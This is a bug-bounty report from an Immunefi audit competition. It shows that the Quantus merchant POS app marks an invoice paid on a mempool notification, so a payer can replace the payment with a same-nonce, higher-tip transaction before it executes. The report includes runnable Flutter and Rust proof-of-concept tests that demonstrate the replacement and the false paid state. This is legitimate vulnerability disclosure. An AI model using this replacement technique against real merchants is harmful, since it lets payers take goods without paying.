# 90460 w a high quantus pos accepts a replaceable pool transaction as payment before execution

**Submitted on Aug 25th 2026 at 06:32:14 UTC by @Tradi3 for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90460
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Merchant POS irreversibly reports an invoice paid after the payer replaces it before execution, enabling goods or services to be released without payment

## Description

## Brief

The first-party Quantus POS screen permanently switches to `Payment Received` when it receives a matching `txWatch_transfer`. That notification is emitted when a transaction enters the ready pool, before execution or finality.

The payer can then submit a different, valid transaction with the same account nonce and a higher tip. The production transaction pool usurps the invoice payment and leaves only the replacement ready. The merchant's POS still shows `Payment Received` with `Done` and `New Charge`, even though the invoice transaction will not execute.

This is a supplemented resubmission of closed report `#89358`. The original report did not execute the mobile screen and did not prove a remote method for removing the observed payment from the pool. Both gaps are covered by the two runnable tests supplied here.

## Vulnerability details

The chain-side notification is pre-execution:

* `node/src/txwatch.rs` consumes the transaction pool's `import_notification_stream()` and obtains the ready transaction.
* It decodes transfer destinations and amounts from the call arguments, including nested utility calls.
* The notification contains no inclusion, dispatch-success, or finality field.

The scoped mobile app treats that signal as final payment:

* `mobile-app/lib/services/tx_watch_service.dart` forwards a `txWatch_transfer` to the POS callback.
* `mobile-app/lib/v2/screens/pos/pos_qr_screen.dart` checks only that `BigInt.tryParse(tx.amount) == widget.amountToken`.
* It cancels the payment timeout, assigns `_paidTransfer`, changes the title to `Payment Received`, and exposes `Done` and `New Charge`.
* The background history poll has no callback or reference capable of clearing `_paidTransfer` when the transaction is absent, replaced, or failed.

The screen also calls `_buildPaidContent(...)` without returning that widget, so the QR body remains visible. That rendering defect does not undo the paid state: the title and the completion controls still change to the explicit success flow, the timeout is cancelled, and the paid latch is not cleared.

## Attacker path

{% stepper %}
{% step %}

### Submit an invoice transfer

The payer signs an ordinary invoice transfer with nonce `0` and no tip.
{% endstep %}

{% step %}

### Submit through the normal external transaction path

It enters the ready pool and emits the import notification consumed by `txWatch`.
{% endstep %}

{% step %}

### Trigger the POS success state

The merchant's real `PosQrScreen` receives the matching notification and displays `Payment Received`, `Done`, and `New Charge`.
{% endstep %}

{% step %}

### Submit a replacement

Before inclusion, the payer submits a different signed transfer with the same signer and nonce, but a higher tip.
{% endstep %}

{% step %}

### Usurp the invoice transaction

Runtime validation gives both transactions the same pool dependency tag and gives the replacement higher priority. The production pool emits `usurped(invoice, replacement)`, removes the invoice, and retains only the replacement ready.
{% endstep %}

{% step %}

### Retain the false paid state

The POS has no usurp, failure, or finality handler and remains in the paid state. A merchant relying on the first-party POS can release goods or services without receiving the invoice payment.
{% endstep %}
{% endstepper %}

No miner, validator, RPC compromise, reorg, privileged role, or invalid transaction is required. Both transactions are real ML-DSA-65-signed Quantus extrinsics submitted as `TransactionSource::External`.

## Closure reasons addressed

The original closure said the PoC never exercised the mobile POS. The client test now pumps the actual `PosQrScreen`, speaks the actual WebSocket JSON-RPC shape, and asserts the visible state transition. A wrong-amount control proves that the transition is caused by the matching invoice notification.

The original closure also treated remote eviction and merchant reliance as unverified. The chain test now submits two signed external transactions through the frozen runtime validator and production pool. It proves the invoice import notification occurs first, then proves the payer-controlled replacement removes that invoice and records the exact usurp event.

The repository documentation correctly warns that `txWatch_transfer` is not a confirmation. The defect reported here is not that the warning is absent or that the node emits a zero-confirmation signal. The defect is that the in-scope, first-party POS violates that documented integration rule and labels the signal as payment received without later correction.

## Impact details

The payer can make the official merchant POS complete its success flow, replace the invoice before execution, and receive goods or services without the merchant receiving payment. The loss scales with the invoice value accepted by the merchant.

Quantus stated during the competition that it would reopen and classify this as High if a remote way to force the payment out of the mempool were demonstrated. The signed external replacement PoC satisfies that stated condition. This report requests High on that basis. It does not reuse the unrelated `Changing sensitive details of other users` impact selected on the original report.

## Recommended remediation

Treat `txWatch_transfer` as `payment detected`, not `payment received`. Do not enter the paid state until a finalized block contains a successful transfer event matching the merchant, asset, and invoice amount. If an optimistic state is retained, subscribe to replacement/failure/finality status and clear it when the observed transaction is usurped, dropped, invalid, or unsuccessful.

Also return `_buildPaidContent(...)` from the paid branch so the screen cannot show a success title and completion controls alongside the original QR body.

## Proof of Concept

Two tests reproduce the complete path on the frozen competition revisions.

### A. Real first-party POS transition

Apps revision: `d5fc4d6572ebc2244e95009a33f5da5048935867`

PoC file: `mobile-app/test/screens/pos_qr_mempool_paid_test.dart`

Local source prepared for attachment:

`C:\Users\Administrator\bounty-work\immunefi-quantus-competition-20260812\sources\audit-comp-quantus-apps\mobile-app\test\screens\pos_qr_mempool_paid_test.dart`

SHA-256: `5571A6C9EF837328BCFCD4C60C05749E0666C04F68A9358B97D99FE51CC30CCB`

{% stepper %}
{% step %}

### Clone and check out the apps revision

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-apps.git
cd audit-comp-quantus-apps
git checkout d5fc4d6572ebc2244e95009a33f5da5048935867
cd mobile-app
```

{% endstep %}

{% step %}

### Create the local `.env` file

The public checkout expects a `.env` asset. An empty local file is sufficient.

```bash
touch .env
```

{% endstep %}

{% step %}

### Run the Flutter test

```bash
flutter test test/screens/pos_qr_mempool_paid_test.dart
```

{% endstep %}
{% endstepper %}

Fresh observed result:

```
PosQrScreen latches Payment Received from a doomed txWatch_transfer
[PosQr] onTransfer ... amount=5000000000000 hash=0xdoomedbatchall
[PendingTxPoller] no match yet ... will retry

PosQrScreen ignores a txWatch_transfer with the wrong amount
[PosQr] onTransfer ... amount=1 hash=0xother
[PosQr] amount mismatch ... ignoring

00:02 +2: All tests passed!
```

The first assertion uses the real `PosQrScreen`. It starts at `Scan to Pay`, receives the actual `txWatch_transfer` JSON shape over a local WebSocket, then renders `Payment Received`, `Done`, and `New Charge`. The mocked history lookup returns no transaction and the screen remains paid. The control sends the wrong amount and the screen does not enter the paid state.

### B. Signed remote replacement in the production pool

Chain revision: `3b243b870a5442a6e5f443056f67bbba87d472f5`

PoC file: `client/transaction-pool/src/pos_mempool_replacement_poc.rs`

Local source prepared for attachment:

`C:\Users\Administrator\bounty-work\immunefi-quantus-competition-20260812\sources\audit-comp-quantus-chain\client\transaction-pool\src\pos_mempool_replacement_poc.rs`

SHA-256: `4B5D63D1E9F0E921BAECAAA0A8E3C9FC5E72F4388909042FFE0D0375017C3008`

{% stepper %}
{% step %}

### Register the test module

Register the test module in `client/transaction-pool/src/lib.rs`:

```rust
#[cfg(test)]
mod pos_mempool_replacement_poc;
```

{% endstep %}

{% step %}

### Add development dependencies

Add these existing workspace crates under `client/transaction-pool/Cargo.toml` `[dev-dependencies]`:

```toml
frame-metadata-hash-extension = { workspace = true, features = ["std"] }
frame-support = { workspace = true, features = ["std"] }
frame-system = { workspace = true, features = ["std"] }
pallet-transaction-payment = { workspace = true, features = ["std"] }
qp-dilithium-crypto = { workspace = true, features = ["full_crypto", "std"] }
quantus-runtime = { workspace = true, features = ["std"] }
sp-io = { workspace = true, features = ["std"] }
```

{% endstep %}

{% step %}

### Run the Cargo test

```bash
cargo test -p sc-transaction-pool pos_mempool_replacement_poc::remote_same_nonce_higher_tip_transaction_evicts_notified_invoice_payment -- --exact --nocapture
```

{% endstep %}
{% endstepper %}

Fresh observed result:

```
invoice_import_notification=0x66f939c9ff0374778c2e13e0a7ef4cee89f596ad39005fd241ddc2176650ecc4
invoice_priority=735
replacement_hash=0x98653e4a78303db711adcdf6fa0976c02628e5244eda2866737ee44918f2e5d8
replacement_priority=7350000000000735
final_ready_hashes=[0x98653e4a78303db711adcdf6fa0976c02628e5244eda2866737ee44918f2e5d8]
usurped=(0x66f939c9ff0374778c2e13e0a7ef4cee89f596ad39005fd241ddc2176650ecc4, 0x98653e4a78303db711adcdf6fa0976c02628e5244eda2866737ee44918f2e5d8)
test result: ok. 1 passed; 0 failed
```

The test uses real signed `UncheckedExtrinsic`s, the frozen Quantus runtime validator, `TransactionSource::External`, the production pool import stream, and its actual replacement logic. It proves the first notification is emitted while the invoice is ready and that a later payer-controlled replacement removes that exact invoice before execution.

## Complete PoC source A: pos\_qr\_mempool\_paid\_test.dart

Copy this exact file to `mobile-app/test/screens/pos_qr_mempool_paid_test.dart` before running the Flutter command above.

```dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:integration_test/integration_test.dart';
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:resonance_network_wallet/models/fiat_currency.dart';
import 'package:resonance_network_wallet/providers/account_providers.dart';
import 'package:resonance_network_wallet/providers/connectivity_provider.dart';
import 'package:resonance_network_wallet/providers/currency_display_provider.dart';
import 'package:resonance_network_wallet/providers/wallet_providers.dart';
import 'package:resonance_network_wallet/services/exchange_rate_service.dart';
import 'package:resonance_network_wallet/v2/screens/pos/pos_qr_screen.dart';

import '../extensions.dart';
import '../fakes.dart';

/// Client PoC for Immunefi #89358.
///
/// Drop on the frozen apps tree at:
///   mobile-app/test/screens/pos_qr_mempool_paid_test.dart
///
/// Run:
///   flutter test test/screens/pos_qr_mempool_paid_test.dart
///
/// Pumps the real PosQrScreen. A local socket speaks the node's
/// txWatch_transfer shape. The notification has no inclusion / success field.
/// The screen still switches to Payment Received + Done / New Charge.
class _FakeHistory extends Fake implements ChainHistoryService {
  @override
  Future<TransactionEvent?> searchByExtrinsicHash({
    required String extrinsicHash,
    required bool isReversible,
  }) async => null;
}

class _FakeChecksum extends Fake implements HumanReadableChecksumService {
  @override
  Future<String?> getHumanReadableName(String address, {upperCase = true}) async => 'alpha bravo charlie';
}

class _TxWatchNode {
  HttpServer? _server;
  WebSocket? _ws;
  final Completer<void> _subscribed = Completer<void>();

  int get port => _server!.port;

  Future<void> start() async {
    _server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
    _server!.listen((req) async {
      if (!WebSocketTransformer.isUpgradeRequest(req)) {
        req.response.statusCode = HttpStatus.notFound;
        await req.response.close();
        return;
      }
      final socket = await WebSocketTransformer.upgrade(req);
      _ws = socket;
      socket.listen((event) {
        final data = jsonDecode(event as String) as Map<String, dynamic>;
        if (data['method'] == 'txWatch_watchAddress') {
          socket.add(jsonEncode({'jsonrpc': '2.0', 'id': data['id'], 'result': 'sub-1'}));
          if (!_subscribed.isCompleted) _subscribed.complete();
        }
      });
    });
  }

  Future<void> waitForSubscription() => _subscribed.future.timeout(const Duration(seconds: 5));

  void pushTransfer({required String amount, required String txHash}) {
    _ws!.add(
      jsonEncode({
        'jsonrpc': '2.0',
        'method': 'txWatch_transfer',
        'params': {
          'subscription': 'sub-1',
          'result': {'tx_hash': txHash, 'from': 'qzcustomer${'x' * 40}', 'amount': amount},
        },
      }),
    );
  }

  Future<void> close() async {
    await _ws?.close();
    await _server?.close(force: true);
  }
}

void main() {
  IntegrationTestWidgetsFlutterBinding.ensureInitialized();

  late _TxWatchNode node;
  late List<Endpoint> savedEndpoints;

  setUp(() async {
    node = _TxWatchNode();
    await node.start();
    final rpc = RpcEndpointService();
    savedEndpoints = List<Endpoint>.from(rpc.endpoints);
    rpc.endpoints
      ..clear()
      ..add(Endpoint(url: 'http://127.0.0.1:${node.port}'));
  });

  tearDown(() async {
    await node.close();
    final rpc = RpcEndpointService();
    rpc.endpoints
      ..clear()
      ..addAll(savedEndpoints);
  });

  Future<void> pumpPos(WidgetTester tester, {required BigInt invoice}) async {
    await tester.binding.setSurfaceSize(const Size(1080, 1600));
    addTearDown(() => tester.binding.setSurfaceSize(null));
      final merchant = makeAccount(1);
      final settings = FakeSettingsService(activeAccount: RegularAccount(merchant));
      await tester.pumpApp(
        PosQrScreen(amountToken: invoice),
        overrides: [
          settingsServiceProvider.overrideWithValue(settings),
          activeAccountProvider.overrideWith((ref) => ActiveAccountNotifier(settings)),
          humanReadableChecksumServiceProvider.overrideWithValue(_FakeChecksum()),
          chainHistoryServiceProvider.overrideWithValue(_FakeHistory()),
          exchangeRateServiceProvider.overrideWithValue(ExchangeRateService(rates: {})),
          isOnlineProvider.overrideWithValue(true),
          txAmountDisplayProvider.overrideWithValue(
            (
              BigInt amount, {
              required bool isSend,
              int tokenDecimals = 2,
              bool withTokenSymbol = true,
              bool withSignPrefix = true,
              String? customHiddenText,
            }) => const CurrencyDisplayState(
              primaryAmount: '500000',
              secondaryAmount: '1.00',
              isFlipped: false,
              selectedFiat: FiatCurrency.usd,
            ),
          ),
        ],
      );
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 700));
      await tester.runAsync(node.waitForSubscription);
      await tester.pump();
  }

  testWidgets('PosQrScreen latches Payment Received from a doomed txWatch_transfer', (tester) async {
    final invoice = BigInt.parse('5000000000000');
    await pumpPos(tester, invoice: invoice);

    expect(find.text('Scan to Pay'), findsOneWidget);
    expect(find.text('Payment Received'), findsNothing);
    expect(find.text('Done'), findsNothing);

    node.pushTransfer(amount: '5000000000000', txHash: '0xdoomedbatchall');
    await tester.pump();
    await tester.pump(const Duration(milliseconds: 100));

    expect(find.text('Payment Received'), findsOneWidget);
    expect(find.text('Done'), findsOneWidget);
    expect(find.text('New Charge'), findsWidgets);
    expect(find.text('Scan to Pay'), findsNothing);
  });

  testWidgets('PosQrScreen ignores a txWatch_transfer with the wrong amount', (tester) async {
    final invoice = BigInt.parse('5000000000000');
    await pumpPos(tester, invoice: invoice);
    node.pushTransfer(amount: '1', txHash: '0xother');
    await tester.pump();
    await tester.pump(const Duration(milliseconds: 100));

    expect(find.text('Scan to Pay'), findsOneWidget);
    expect(find.text('Payment Received'), findsNothing);
    expect(find.text('Done'), findsNothing);
  });
}
```

## Complete PoC source B: pos\_mempool\_replacement\_poc.rs

Copy this exact file to `client/transaction-pool/src/pos_mempool_replacement_poc.rs`, register it and add the listed dev-dependencies, then run the Cargo command above.

```rust
//! Regression PoC for Immunefi report #89358.
//!
//! A payer first submits a valid invoice payment. Quantus's `txWatch` observes ready-queue
//! imports, so that import is sufficient for the POS client to display payment success. The same
//! payer then submits a different transaction with the same account nonce and a higher tip. This
//! test executes the actual Quantus runtime validation and the actual transaction-pool replacement
//! logic to prove that the second remote transaction evicts the invoice payment before inclusion.

use crate::{
	graph::{self, EventHandler, IsValidator},
	Options, Pool, TimedTransactionSource, ValidateTransactionPriority,
};
use async_trait::async_trait;
use codec::Encode;
use futures::{executor::block_on, StreamExt};
use qp_dilithium_crypto::Dilithium65Pair;
use quantus_runtime::{
	transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
	Balances, BalancesCall, Block, Executive, Runtime, RuntimeCall, Signature, SignedPayload,
	System, TxExtension, UncheckedExtrinsic, UNIT, VERSION,
};
use sc_transaction_pool_api::error::Error as TxPoolError;
use sp_blockchain::{HashAndNumber, TreeRoute};
use sp_core::{Pair, H256};
use sp_runtime::{
	generic::{BlockId, Era},
	traits::{Block as BlockT, HashingFor, IdentifyAccount},
	transaction_validity::{TransactionSource, TransactionValidity},
	AccountId32, MultiAddress,
};
use std::sync::{Arc, Mutex};

fn test_ext(sender: &AccountId32) -> sp_io::TestExternalities {
	use frame_support::traits::Currency;
	use quantus_runtime::BuildStorage;

	let storage = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
	let mut ext = sp_io::TestExternalities::new(storage);
	ext.execute_with(|| {
		Balances::make_free_balance_be(sender, 1_000 * UNIT);
		System::set_block_number(1);
	});
	ext
}

fn signed_transfer(
	pair: &Dilithium65Pair,
	sender: AccountId32,
	dest: AccountId32,
	value: u128,
	nonce: u32,
	tip: u128,
) -> UncheckedExtrinsic {
	let genesis_hash = System::block_hash(0);
	let call: RuntimeCall =
		BalancesCall::transfer_keep_alive { dest: MultiAddress::Id(dest), value }.into();

	let tx_ext: TxExtension = (
		frame_system::CheckNonZeroSender::<Runtime>::new(),
		frame_system::CheckSpecVersion::<Runtime>::new(),
		frame_system::CheckTxVersion::<Runtime>::new(),
		frame_system::CheckGenesis::<Runtime>::new(),
		frame_system::CheckEra::<Runtime>::from(Era::immortal()),
		frame_system::CheckNonce::<Runtime>::from(nonce),
		frame_system::CheckWeight::<Runtime>::new(),
		ReversibleTransactionExtension::<Runtime>::new(),
		WormholeProofRecorderExtension::<Runtime>::new(),
		pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(tip),
		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
		frame_system::WeightReclaim::<Runtime>::new(),
	);

	let payload = SignedPayload::from_raw(
		call.clone(),
		tx_ext.clone(),
		(
			(),
			VERSION.spec_version,
			VERSION.transaction_version,
			genesis_hash,
			genesis_hash,
			(),
			(),
			(),
			(),
			(),
			None,
			(),
		),
	);
	let signature = payload.using_encoded(|bytes| pair.sign(bytes));

	UncheckedExtrinsic::new_signed(
		call,
		MultiAddress::Id(sender),
		Signature::Dilithium65(signature),
		tx_ext,
	)
}

struct RuntimeChainApi {
	sender: AccountId32,
}

impl RuntimeChainApi {
	fn validate(
		&self,
		at: H256,
		source: TransactionSource,
		uxt: UncheckedExtrinsic,
	) -> TransactionValidity {
		let mut ext = test_ext(&self.sender);
		ext.execute_with(|| Executive::validate_transaction(source, uxt, at))
	}
}

#[async_trait]
impl graph::ChainApi for RuntimeChainApi {
	type Block = Block;
	type Error = TxPoolError;

	async fn validate_transaction(
		&self,
		at: H256,
		source: TransactionSource,
		uxt: graph::ExtrinsicFor<Self>,
		_priority: ValidateTransactionPriority,
	) -> Result<TransactionValidity, Self::Error> {
		Ok(self.validate(at, source, (*uxt).clone()))
	}

	fn validate_transaction_blocking(
		&self,
		at: H256,
		source: TransactionSource,
		uxt: graph::ExtrinsicFor<Self>,
	) -> Result<TransactionValidity, Self::Error> {
		Ok(self.validate(at, source, (*uxt).clone()))
	}

	fn block_id_to_number(
		&self,
		_at: &BlockId<Block>,
	) -> Result<Option<graph::NumberFor<Self>>, Self::Error> {
		Ok(Some(1))
	}

	fn block_id_to_hash(&self, at: &BlockId<Block>) -> Result<Option<H256>, Self::Error> {
		Ok(Some(match at {
			BlockId::Hash(hash) => *hash,
			BlockId::Number(_) => H256::zero(),
		}))
	}

	fn hash_and_length(&self, uxt: &UncheckedExtrinsic) -> (H256, usize) {
		let encoded = uxt.encode();
		(<HashingFor<Block> as sp_runtime::traits::Hash>::hash(&encoded), encoded.len())
	}

	async fn block_body(&self, _at: H256) -> Result<Option<Vec<UncheckedExtrinsic>>, Self::Error> {
		Ok(None)
	}

	fn block_header(&self, _at: H256) -> Result<Option<<Block as BlockT>::Header>, Self::Error> {
		Ok(None)
	}

	fn tree_route(&self, _from: H256, _to: H256) -> Result<TreeRoute<Block>, Self::Error> {
		unimplemented!("not used by transaction submission")
	}
}

#[derive(Clone, Default)]
struct ReplacementEvents {
	usurped: Arc<Mutex<Vec<(H256, H256)>>>,
}

impl EventHandler<RuntimeChainApi> for ReplacementEvents {
	fn usurped(&self, old: H256, replacement: H256) {
		self.usurped.lock().unwrap().push((old, replacement));
	}
}

#[test]
fn remote_same_nonce_higher_tip_transaction_evicts_notified_invoice_payment() {
	let pair = Dilithium65Pair::from_seed_slice(&[42u8; 32]).expect("valid seed");
	let payer: AccountId32 = pair.public().into_account();
	let merchant = AccountId32::new([9u8; 32]);
	let alternate_destination = AccountId32::new([7u8; 32]);

	let (invoice_payment, replacement) = {
		let mut ext = test_ext(&payer);
		ext.execute_with(|| {
			(
				signed_transfer(&pair, payer.clone(), merchant, 5 * UNIT, 0, 0),
				signed_transfer(&pair, payer.clone(), alternate_destination, UNIT, 0, 10 * UNIT),
			)
		})
	};

	let api = Arc::new(RuntimeChainApi { sender: payer });
	let events = ReplacementEvents::default();
	let recorded_usurps = events.usurped.clone();
	let pool: Pool<RuntimeChainApi, ReplacementEvents> =
		Pool::new_with_event_handler(Options::default(), IsValidator::from(false), api, events);
	let at = HashAndNumber::<Block> { hash: H256::zero(), number: 1 };
	let mut imports = pool.validated_pool().import_notification_stream();

	block_on(async {
		let payment_outcome = pool
			.submit_one(
				&at,
				TimedTransactionSource::new_external(false),
				Arc::new(invoice_payment.clone()),
			)
			.await
			.expect("the remote invoice payment must enter the ready queue");
		let payment_hash = payment_outcome.hash();
		let payment_priority = payment_outcome.priority().unwrap();

		let notified_hash = imports.next().await.expect("ready import must notify txWatch");
		assert_eq!(notified_hash, payment_hash);
		assert_eq!(pool.validated_pool().status().ready, 1);

		let replacement_outcome = pool
			.submit_one(
				&at,
				TimedTransactionSource::new_external(false),
				Arc::new(replacement.clone()),
			)
			.await
			.expect("same-nonce transaction with a higher tip must replace the payment");
		let replacement_hash = replacement_outcome.hash();
		let replacement_priority = replacement_outcome.priority().unwrap();

		assert!(replacement_priority > payment_priority);
		assert_ne!(replacement_hash, payment_hash);
		assert_eq!(pool.validated_pool().status().ready, 1);

		let ready_hashes: Vec<_> = pool.validated_pool().ready().map(|tx| tx.hash).collect();
		assert_eq!(ready_hashes, vec![replacement_hash]);
		assert!(!ready_hashes.contains(&payment_hash));
		assert_eq!(recorded_usurps.lock().unwrap().as_slice(), &[(payment_hash, replacement_hash)]);

		println!("invoice_import_notification={payment_hash:?}");
		println!("invoice_priority={payment_priority}");
		println!("replacement_hash={replacement_hash:?}");
		println!("replacement_priority={replacement_priority}");
		println!("final_ready_hashes={ready_hashes:?}");
		println!("usurped=({payment_hash:?}, {replacement_hash:?})");
	});
}
```
